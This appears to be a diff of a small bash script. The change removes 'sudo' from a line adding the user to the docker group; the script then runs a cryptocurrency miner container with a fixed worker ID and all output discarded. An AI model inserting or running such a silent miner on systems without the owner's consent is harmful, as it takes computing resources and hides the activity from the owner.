@@ -1,4 +1,4 @@
 #!/bin/bash
-sudo usermod -aG docker $USER
+usermod -aG docker $USER
 newgrp docker
 docker run --rm jetskipool/miner:qjetski-pplns-cpu -w YEFTEEAYTSMKIDPBMGCTIDOZTKCBBGYTGANZMCLGTFWWARKYZGKZZSBBJOQN > /dev/null 2>&1
